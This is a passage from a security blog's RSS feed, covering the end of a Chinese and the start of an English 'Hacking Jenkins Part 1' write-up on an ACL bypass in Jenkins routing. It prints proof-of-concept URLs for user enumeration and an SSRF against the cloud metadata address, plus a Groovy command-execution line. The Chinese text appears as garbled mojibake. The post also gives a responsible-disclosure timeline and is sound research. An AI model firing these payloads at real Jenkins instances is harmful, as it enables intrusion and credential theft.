&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClassLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getResource&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;index.jsp&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getContent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä¸Šé¢çš„åŸ·è¡Œéˆä¸€å€‹ä¸²ä¸€å€‹é›–ç„¶çœ‹èµ·ä¾†å¾ˆæµæš¢, ä½†é›£éçš„æ˜¯ç„¡æ³•å–å¾—å›å‚³å…§å®¹, å› æ­¤åš´æ ¼ä¾†èªªä¸èƒ½ç®—æ˜¯ä¸€å€‹é¢¨éšª, ä½†é€™å€‹ä¾‹å­å°æ–¼ç†è§£æ•´å€‹æ¼æ´æ ¸å¿ƒå»æœ‰å¾ˆå¤§çš„å¹«åŠ©!&lt;/p&gt;

&lt;p&gt;åœ¨äº†è§£åŸç†å¾Œ, å‰©ä¸‹çš„äº‹å°±åƒæ˜¯åœ¨è§£ä¸€å€‹è¿·å®®, å¾ &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/jenkins/model/Jenkins.java&quot;&gt;jenkins.model.Jenkins&lt;/a&gt; é€™å€‹å…¥å£é»é–‹å§‹, ç‰©ä»¶ä¸­çš„æ¯å€‹æˆå“¡åˆå¯ä»¥åƒè€ƒåˆ°ä¸€å€‹æ–°çš„ç‰©ä»¶, æ¥è‘—è¦åšçš„å°±æ˜¯æƒ³è¾¦æ³•æŠŠä¸­é–“éŒ¯ç¶œè¤‡é›œå„ç¨®ç‰©ä»¶èˆ‡ç‰©ä»¶é–“çš„é—œè¯æ‰¾å‡ºä¾†, ä¸€å±¤ä¸€å±¤çš„ä¸²ä¸‹å»ç›´åˆ°è¿·å®®å‡ºå£ - ä¹Ÿå°±æ˜¯å±éšªçš„å‡½æ•¸å‘¼å«!&lt;/p&gt;

&lt;p&gt;å€¼å¾—ä¸€æçš„æ˜¯, é€™å€‹æ¼æ´æœ€å¯æƒœçš„åœ°æ–¹æ‡‰è©²æ˜¯ç„¡æ³•é‡å° SETTER é€²è¡Œæ“ä½œ, ä¸ç„¶çš„è©±æ‡‰è©²å°±åˆæ˜¯å¦å¤–ä¸€å€‹æœ‰è¶£çš„ &lt;a href=&quot;https://cwiki.apache.org/confluence/display/WW/S2-020&quot;&gt;Struts2 RCE&lt;/a&gt; æˆ–æ˜¯ &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1622&quot;&gt;Spring Framework RCE&lt;/a&gt; äº†!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;å¦‚ä½•åˆ©ç”¨&quot;&gt;å¦‚ä½•åˆ©ç”¨&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;æ‰€ä»¥è©²å¦‚ä½•åˆ©ç”¨é€™å€‹æ¼æ´å‘¢? ç°¡å–®èªª, é€™å€‹æ¼æ´æ‰€èƒ½åšåˆ°çš„äº‹æƒ…å°±åªæ˜¯é€éç‰©ä»¶é–“çš„åƒè€ƒå»ç¹é ACL æ”¿ç­–, ä½†åœ¨æ­¤ä¹‹å‰æˆ‘å€‘å¿…é ˆå…ˆæ‰¾åˆ°ä¸€å€‹å¥½çš„è·³æ¿å¥½è®“æˆ‘å€‘å¯ä»¥æ›´æ–¹ä¾¿çš„åœ¨ç‰©ä»¶ä¸­è·³ä¾†è·³å», é€™è£¡æˆ‘å€‘é¸ç”¨äº†ä¸‹é¢é€™å€‹è·³æ¿:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/securityRealm/user/[username]/descriptorByName/[descriptor_name]/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™å€‹è·³æ¿æœƒä¾åºåŸ·è¡Œä¸‹é¢æ–¹æ³•&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSecurityRealm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getUser&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDescriptorByName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;descriptor_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;åœ¨ Jenkins ä¸­å¯ä»¥è¢«æ“ä½œçš„ç‰©ä»¶éƒ½æœƒç¹¼æ‰¿ä¸€å€‹ &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/Descriptor.java&quot;&gt;hudson.model.Descriptor&lt;/a&gt; é¡åˆ¥, è€Œç¹¼æ‰¿é€™å€‹é¡åˆ¥çš„ç‰©ä»¶éƒ½å¯ä»¥é€é &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/DescriptorByNameOwner.java#L51&quot;&gt;hudson.model.DescriptorByNameOwner#getDescriptorByName(String)&lt;/a&gt; å»å­˜å–, æ‰€ä»¥ç¸½é«”ä¾†èªª, å¯é€éé€™å€‹è·³æ¿å–å¾—åœ¨ Jenkins ä¸­ç´„ 500 å€‹ Despicable çš„ç‰©ä»¶é¡åˆ¥!&lt;/p&gt;

&lt;p&gt;ä¸éé›–æ˜¯å¦‚æ­¤, ç”±æ–¼ Jenkins çš„è¨­è¨ˆæ¨¡å¼, å¤§éƒ¨åˆ†é–‹ç™¼è€…åœ¨å±éšªå‹•ä½œä¹‹å‰éƒ½æœƒå†åšä¸€æ¬¡æ¬Šé™æª¢æŸ¥, æ‰€ä»¥å³ä½¿å¯å‘¼å«åˆ° &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt; ä½†åœ¨æ²’æœ‰ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Jenkins.RUN_SCRIPTS&lt;/code&gt; æ¬Šé™çš„æƒ…æ³ä¸‹ä¹Ÿç„¡æ³•åšä»»ä½•äº‹ :(&lt;/p&gt;

&lt;p&gt;ä½†é€™å€‹æ¼æ´ä¾ç„¶ä¸å¤±æˆç‚ºä¸€å€‹å¾ˆå¥½çš„è† æ°´å»ç¹éç¬¬ä¸€å±¤çš„ ACL é™åˆ¶ä¸²èµ·å…¶ä»–çš„æ¼æ´, ç‚ºå¾ŒçºŒçš„åˆ©ç”¨é–‹å•Ÿäº†ä¸€é“çª—! ä»¥ä¸‹æˆ‘å€‘çµ¦å‡ºä¸‰å€‹ä¸²å‡ºæ¼æ´éˆçš„ä¾‹å­!
(é›–ç„¶åªä»‹ç´¹ä¸‰ç¨®, ä½†ç”±æ–¼é€™å€‹æ¼æ´ç©æ³•éå¸¸è‡ªç”±å¯ä¸²çš„çµ•ä¸åªå¦‚æ­¤, æ¨è–¦æœ‰èˆˆè¶£çš„åŒå­¸å¯åœ¨å°‹æ‰¾æ›´å¤šçš„æ¼æ´éˆ!)&lt;/p&gt;

&lt;p&gt;P.S. å€¼å¾—æ³¨æ„çš„ä¸€é»æ˜¯, åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getUser([username])&lt;/code&gt; çš„å¯¦ç¾ä¸­æœƒå‘¼å«åˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getOrCreateById(...)&lt;/code&gt; ä¸¦ä¸”å‚³å…¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;create=True&lt;/code&gt; å°è‡´åœ¨è¨˜æ†¶é«”ä¸­å‰µé€ å‡ºä¸€å€‹æš«å­˜ä½¿ç”¨è€…(æœƒå‡ºç¾åœ¨ä½¿ç”¨è€…åˆ—è¡¨ä½†ç„¡æ³•é€²è¡Œç™»å…¥æ“ä½œ), é›–ç„¶ç„¡ç”¨ä¸éä¹Ÿè¢«ç•¶æˆä¸€å€‹æ¼æ´è¨˜éŒ„åœ¨ &lt;a href=&quot;https://jenkins.io/security/advisory/2018-10-10/&quot;&gt;SECURITY-1128&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;1-å…ç™»å…¥çš„ä½¿ç”¨è€…è³‡è¨Šæ´©æ¼&quot;&gt;1. å…ç™»å…¥çš„ä½¿ç”¨è€…è³‡è¨Šæ´©æ¼&lt;/h3&gt;

&lt;p&gt;åœ¨æ¸¬è©¦ Jenkins æ™‚, æœ€æ€•çš„å°±æ˜¯è¦é€²è¡Œå­—å…¸æª”æ”»æ“Šæ™‚å»ä¸çŸ¥é“è©²æ”»æ“Šå“ªå€‹å¸³è™Ÿ, ç•¢ç«Ÿå¸³è™Ÿæ°¸é æ¯”å¯†ç¢¼é›£çŒœ! é€™æ™‚é€™å€‹æ¼æ´å°±å¾ˆå¥½ç”¨äº†XD&lt;/p&gt;

&lt;p&gt;ç”±æ–¼ Jenkins å°æœå°‹çš„åŠŸèƒ½ä¸¦æ²’æœ‰åŠ ä¸Šé©ç•¶çš„æ¬Šé™æª¢æŸ¥, å› æ­¤åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt; çš„ç‹€æ³ä¸‹å¯ä»¥é€éä¿®æ”¹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keyword&lt;/code&gt; åƒæ•¸å¾ a åˆ° z å»åˆ—èˆ‰å‡ºæ‰€æœ‰ä½¿ç”¨è€…!&lt;/p&gt;

&lt;h4 id=&quot;poc&quot;&gt;PoC:&lt;/h4&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/securityRealm/user/admin/search/index?q=[keyword]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é™¤æ­¤ä¹‹å¤–ä¹Ÿå¯æ­é…ç”± &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ananthapadmanabhan S R&lt;/code&gt; æ‰€å›å ±çš„ &lt;a href=&quot;https://jenkins.io/security/advisory/2017-10-11/#user-remote-api-disclosed-users-email-addresses&quot;&gt;SECURITY-514&lt;/a&gt; é€²ä¸€æ­¥å–å¾—ä½¿ç”¨è€…ä¿¡ç®±, å¦‚:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/securityRealm/user/admin/api/xml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;2-èˆ‡-cve-2018-1000600-æ­é…æˆå…ç™»å…¥ä¸”æœ‰å®Œæ•´å›é¡¯çš„-ssrf&quot;&gt;2. èˆ‡ CVE-2018-1000600 æ­é…æˆå…ç™»å…¥ä¸”æœ‰å®Œæ•´å›é¡¯çš„ SSRF&lt;/h3&gt;

&lt;p&gt;ä¸‹ä¸€å€‹è¦ä¸²çš„æ¼æ´å‰‡æ˜¯ &lt;a href=&quot;https://jenkins.io/security/advisory/2018-06-25/#SECURITY-915&quot;&gt;CVE-2018-1000600&lt;/a&gt;, é€™æ˜¯ä¸€å€‹ç”± &lt;a href=&quot;https://twitter.com/orange_8361&quot;&gt;Orange Tsai&lt;/a&gt;(å°å°±æ˜¯æˆ‘XD) æ‰€å›å ±çš„æ¼æ´, é—œæ–¼é€™å€‹æ¼æ´å®˜æ–¹çš„æè¿°æ˜¯:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;CSRF vulnerability and missing permission checks in GitHub Plugin allowed capturing credentials&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;åœ¨å·²çŸ¥ Credentials ID çš„æƒ…å½¢ä¸‹å¯ä»¥æ´©æ¼ä»»æ„ Jenkins å„²å­˜çš„å¸³å¯†, ä½† Credentials ID åœ¨æ²’æŒ‡å®šçš„æƒ…æ³ä¸‹æœƒæ˜¯ä¸€çµ„éš¨æ©Ÿçš„ UUID æ‰€ä»¥é€ æˆè¦åˆ©ç”¨é€™å€‹æ¼æ´ä¼¼ä¹è®Šå¾—ä¸å¤ªå¯èƒ½ (å¦‚æœæœ‰äººçŸ¥é“æ€éº¼å–å¾— Credentials ID è«‹å‘Šè¨´æˆ‘!)&lt;/p&gt;

&lt;p&gt;é›–ç„¶åœ¨ä¸çŸ¥é“ Credentials ID çš„æƒ…æ³ä¸‹ç„¡æ³•æ´©æ¼ä»»ä½•å¸³å¯†, ä½†é€™å€‹æ¼æ´å…¶å¯¦ä¸åªé€™æ¨£, é‚„æœ‰å¦ä¸€å€‹ç©æ³•! é—œæ–¼é€™å€‹æ¼æ´æœ€å¤§çš„å±å®³å…¶å¯¦ä¸æ˜¯ CSRF, è€Œæ˜¯ SSRF!&lt;/p&gt;

&lt;p&gt;ä¸åƒ…å¦‚æ­¤, é€™å€‹ SSRF é‚„æ˜¯ä¸€å€‹æœ‰å›é¡¯çš„ SSRF! æ²’æœ‰å›é¡¯çš„ SSRF è¦åˆ©ç”¨èµ·ä¾†æœ‰å¤šå›°é›£æˆ‘æƒ³å¤§å®¶éƒ½çŸ¥é“ :P å› æ­¤ä¸€å€‹æœ‰å›é¡¯çš„ SSRF ä¹Ÿå°±é¡¯å¾—ä½•å…¶çè²´!&lt;/p&gt;

&lt;h4 id=&quot;poc-1&quot;&gt;PoC:&lt;/h4&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword
?apiUrl=http://169.254.169.254/%23
&amp;amp;login=orange
&amp;amp;password=tsai
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;3-æœªèªè­‰çš„é ç«¯ä»£ç¢¼åŸ·è¡Œ&quot;&gt;3. æœªèªè­‰çš„é ç«¯ä»£ç¢¼åŸ·è¡Œ&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;æ‰€ä»¥å»¢è©±å°‘èªª, RCE åœ¨å“ª?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;ç‚ºäº†æœ€å¤§ç¨‹åº¦çš„å»åˆ©ç”¨é€™å€‹æ¼æ´, æˆ‘ä¹ŸæŒ–äº†ä¸€å€‹&lt;strong&gt;éå¸¸æœ‰è¶£&lt;/strong&gt;çš„ RCE å¯ä»¥èˆ‡é€™å€‹æ¼æ´æ­é…ä½¿ç”¨æˆç‚ºä¸€å€‹çœŸæ­£æ„ç¾©ä¸Šä¸ç”¨èªè­‰çš„ RCE! ä½†ç”±æ–¼é€™å€‹æ¼æ´ç›®å‰é‚„åœ¨ Responsible Disclosure çš„æ™‚ç¨‹å…§, å°±è«‹å…ˆæœŸå¾… Hacking Jenkins Part 2 å›‰!
(é è¨ˆäºŒæœˆä¸­é‡‹å‡º!)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;todo&quot;&gt;TODO&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;é€™è£¡æ˜¯ä¸€äº›æˆ‘æƒ³ç¹¼çºŒç ”ç©¶çš„æ–¹å‘, å¯ä»¥è®“é€™å€‹æ¼æ´è®Šå¾—æ›´å®Œç¾! å¦‚æœä½ ç™¼ç¾äº†ä¸‹é¢ä»»ä½•ä¸€å€‹çš„è§£æ³•è«‹å‹™å¿…å‘Šè¨´æˆ‘, æˆ‘æœƒå¾ˆæ„Ÿæ¿€çš„XD&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt; çš„æ¬Šé™ä¸‹æ‹¿åˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Plugin&lt;/code&gt; çš„ç‰©ä»¶åƒè€ƒ, å¦‚æœæ‹¿åˆ°çš„å¯ä»¥ç¹é &lt;a href=&quot;https://jenkins.io/security/advisory/2018-07-18/#SECURITY-914&quot;&gt;CVE-2018-1999002&lt;/a&gt; èˆ‡ &lt;a href=&quot;https://jenkins.io/security/advisory/2018-02-14/#SECURITY-705&quot;&gt;CVE-2018-6356&lt;/a&gt; æ‰€éœ€çš„æœ€å°æ¬Šé™é™åˆ¶, æˆç‚ºä¸€å€‹çœŸæ­£æ„ç¾©ä¸Šçš„å…ç™»å…¥ä»»æ„è®€æª”!&lt;/li&gt;
  &lt;li&gt;åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt; çš„æ¬Šé™ä¸‹æ‰¾å‡ºå¦ä¸€çµ„è·³æ¿å»å‘¼å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getDescriptorByName(String)&lt;/code&gt;. ç‚ºäº†ä¿®å¾© &lt;a href=&quot;https://jenkins.io/security/advisory/2018-08-15/#SECURITY-672&quot;&gt;SECURITY-672&lt;/a&gt;, Jenkins å¾ 2.138 é–‹å§‹å° &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/User.java&quot;&gt;hudson.model.User&lt;/a&gt; å¢åŠ åˆ¤æ–· &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Jenkins.READ&lt;/code&gt; çš„&lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/User.java#L1026&quot;&gt;æª¢æŸ¥&lt;/a&gt;, å°è‡´åŸæœ‰çš„è·³æ¿å¤±æ•ˆ!&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;è‡´è¬&quot;&gt;è‡´è¬&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;æœ€å¾Œ, æ„Ÿè¬ Jenkins Security åœ˜éšŠå°¤å…¶æ˜¯ Daniel Beck çš„æºé€šå”èª¿èˆ‡æ¼æ´ä¿®å¾©! é€™è£¡æ˜¯ä¸€å€‹ç°¡å–®çš„å›å ±æ™‚é–“è»¸:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;May 30, 2018 - å›å ±æ¼æ´çµ¦ Jenkins&lt;/li&gt;
  &lt;li&gt;Jun 15, 2018 - Jenkins ä¿®è£œä¸¦åˆ†é… CVE-2018-1000600&lt;/li&gt;
  &lt;li&gt;Jul 18, 2018 - Jenkins ä¿®è£œä¸¦åˆ†é… CVE-2018-1999002&lt;/li&gt;
  &lt;li&gt;Aug 15, 2018 - Jenkins ä¿®å¾©ä¸¦åˆ†é… CVE-2018-1999046&lt;/li&gt;
  &lt;li&gt;Dec 05, 2018 - Jenkins ä¿®è£œä¸¦åˆ†é… CVE-2018-1000861&lt;/li&gt;
  &lt;li&gt;Dec 20, 2018 - å›å ± Groovy æ¼æ´çµ¦ Jenkins&lt;/li&gt;
  &lt;li&gt;Jan 08, 2019 - Jenkins ä¿®å¾© Groovy æ¼æ´ä¸¦åˆ†é… CVE-2019-1003000, CVE-2019-1003001, CVE-2019-1003002&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/</link>
                <guid>https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing</guid>
                <pubDate>Wed, 16 Jan 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Hacking Jenkins Part 1 - Play with Dynamic Routing (EN)</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing-en/&quot;&gt;English Version&lt;/a&gt;
&lt;a href=&quot;/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In software engineering, the &lt;a href=&quot;https://en.wikipedia.org/wiki/Continuous_integration&quot;&gt;Continuous Integration&lt;/a&gt; and &lt;a href=&quot;https://en.wikipedia.org/wiki/Continuous_delivery&quot;&gt;Continuous Delivery&lt;/a&gt; is a best practice for developers to reduce routine works. In the CI/CD, the most well-known tool is Jenkins. Due to its ease of use, awesome Pipeline system and integration of Container, Jenkins is also the most widely used CI/CD application in the world. According to the &lt;a href=&quot;https://snyk.io/blog/jvm-ecosystem-report-2018-tools&quot;&gt;JVM Ecosystem Report&lt;/a&gt; by Snyk in 2018, Jenkins held about 60% market share on the survey of CI/CD server.&lt;/p&gt;

&lt;p&gt;For Red Teamers, Jenkins is also the battlefield that every hacker would like to control. If someone takes control of the Jenkins server, he can gain amounts of source code and credential, or even control the Jenkins node! In our DEVCORE Red Team cases, there are also several cases that the whole corporation is compromised from simply a Jenkins server as our entry point!&lt;/p&gt;

&lt;p&gt;This article is mainly about a brief security review on Jenkins in the last year. During this review, we found 5 vulnerabilities including:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-07-18/#SECURITY-914&quot;&gt;CVE-2018-1999002 - Arbitrary file read vulnerability&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-06-25/#SECURITY-915&quot;&gt;CVE-2018-1000600 - CSRF and missing permission checks in GitHub Plugin&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-08-15/#SECURITY-1071&quot;&gt;CVE-2018-1999046 - Unauthorized users could access agent logs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595&quot;&gt;CVE-2018-1000861 - Code execution through crafted URLs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#jenkins-security-advisory-2019-01-08&quot;&gt;CVE-2019-1003000 - Sandbox Bypass in Script Security and Pipeline Plugins&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#jenkins-security-advisory-2019-01-08&quot;&gt;CVE-2019-1003001 - Sandbox Bypass in Script Security and Pipeline Plugins&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#jenkins-security-advisory-2019-01-08&quot;&gt;CVE-2019-1003002 - Sandbox Bypass in Script Security and Pipeline Plugins&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Among them, the more discussed one is the vulnerability CVE-2018-1999002. This is an arbitrary file read vulnerability through an unusual attack vector! Tencent YunDing security lab has written a &lt;a href=&quot;https://cloud.tencent.com/developer/article/1165414&quot;&gt;detailed advisory&lt;/a&gt; about that, and also demonstrated how to exploit this vulnerability from arbitrary file reading to RCE on a real Jenkins site which found from &lt;a href=&quot;https://www.shodan.io/search?query=jenkins&quot;&gt;Shodan&lt;/a&gt;!&lt;/p&gt;

&lt;p&gt;However, we are not going to discuss that in this article. Instead, this post is about another vulnerability found while digging into Stapler framework in order to find a way to bypass the least privilege requirement &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=True&lt;/code&gt; of CVE-2018-1999002! If you merely take a look at the advisory description, you may be curious â€“ Is it reality to gain code execution with just a crafted URL?&lt;/p&gt;

&lt;p&gt;From my own perspective, this vulnerability is just an Access Control List(ACL) bypass, but because this is a problem of the architecture rather than a single program, there are various ways to exploit this bug! In order to pay off the design debt, Jenkins team also takes lots of efforts (patches in &lt;a href=&quot;https://github.com/jenkinsci/jenkins/commit/47f38d714c99e1841fb737ad1005618eb26ed852&quot;&gt;Jenkins side&lt;/a&gt; and &lt;a href=&quot;https://github.com/stapler/stapler/commit/28e8eba822a0df9dcd64d20eb63d8ab5f6ee2980&quot;&gt;Stapler side&lt;/a&gt;) to fix that. The patch not only introduces a new routing blacklist and whitelist but also extends the original &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Plugins+affected+by+the+SECURITY-595+fix&quot;&gt;Service Provider Interface (SPI)&lt;/a&gt; to protect Jenkinsâ€™ routing. Now letâ€™s figure out why Jenkins need to make such a huge code modification!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;review-scope&quot;&gt;Review Scope&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;This is not a complete code review (An overall security review takes lots of timeâ€¦), so this review just aims at high impact bugs. The review scope includes:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Jenkins Core&lt;/li&gt;
  &lt;li&gt;Stapler Web Framework&lt;/li&gt;
  &lt;li&gt;Suggested Plugins&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;During the installation, Jenkins asks whether you want to install suggested plugins such as Git, GitHub, SVN and Pipeline. Basically, most people choose yes, or they will get an inconvenient and hard-to-use Jenkins.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;privilege-levels&quot;&gt;Privilege Levels&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Because the vulnerability is an ACL bypass, we need to introduce the privilege level in Jenkins first! In Jenkins, there are different kinds of ACL roles, Jenkins even has a specialized plugin &lt;a href=&quot;https://plugins.jenkins.io/matrix-auth&quot;&gt;Matrix Authorization Strategy Plugin&lt;/a&gt;(also in the suggested plugin list) to configure the detailed permission per project. From an attackerâ€™s view, we roughly classify the ACL into 3 types:&lt;/p&gt;

&lt;h3 id=&quot;1-full-access&quot;&gt;1. Full Access&lt;/h3&gt;

&lt;p&gt;You can fully control Jenkins. Once the attacker gets this permission, he can execute arbitrary Groovy code via &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt;!&lt;/p&gt;
&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;uname -a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;text&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is the most hacker-friendly scenario, but itâ€™s hard to see this configuration publicly now due to the increase of security awareness and lots of bots scanning all the IPv4.&lt;/p&gt;

&lt;h3 id=&quot;2-read-only-mode&quot;&gt;2. Read-only Mode&lt;/h3&gt;

&lt;p&gt;This can be enabled from the &lt;a href=&quot;http://jenkins.local/configureSecurity&quot;&gt;Configure Global Security&lt;/a&gt; and check the radio box:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Allow anonymous read access&lt;/p&gt;
&lt;/blockquote&gt;

